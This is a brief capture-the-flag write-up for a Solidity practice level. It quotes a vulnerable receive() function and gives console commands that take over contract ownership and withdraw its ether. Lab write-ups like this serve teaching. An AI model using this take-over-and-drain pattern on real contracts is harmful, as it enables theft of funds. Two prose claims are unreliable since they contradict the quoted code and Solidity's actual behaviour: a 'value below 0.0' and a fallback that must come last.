## Fallback memes

In a nutshell, solidity will always require some sort of fallback method to be able to process any non-standard transaction sent to the contract. 
This includes any sort of transaction with no data, no matching parameters and so and forth. As of current state, the default fallback method is
the last one in the contract. It has to be external and payable.

In our meme of a contract, we're provided with the following fallback method:


```sol
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. Here are the commands:
```
contract.contribute({to: instance, from: player, value: toWei("0.0005", "ether")})
sendTransaction({from: player, to: contract, value: toWei("0.0005", "ether")})
contract.withdraw()
```

Tada... how anticlimactic.
